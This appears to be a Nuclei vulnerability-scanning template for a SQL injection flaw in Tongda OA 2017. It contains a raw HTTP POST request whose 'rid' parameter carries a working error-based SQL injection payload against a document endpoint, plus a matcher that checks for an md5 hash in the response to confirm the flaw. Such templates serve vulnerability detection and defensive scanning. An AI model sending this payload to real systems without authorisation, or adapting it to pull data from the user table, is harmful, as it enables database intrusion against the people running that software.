id: tongda-sqli
info:
  author: Str1am
  name: "\u901A\u8FBEOA2017 sql\u6CE8\u5165\u6F0F\u6D1E"
  severity: high
  tags: tongda,sqli
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 202cb962ac59075b964b07152d234b70
  matchers-condition: and
  raw:
  - 'POST /general/document/index.php/recv/register/turn HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _SERVER=&rid=exp(~(select*from(select concat(0x7e7e7e,md5(123),0x7e7e7e) from
    user limit 0,1)x))

    '
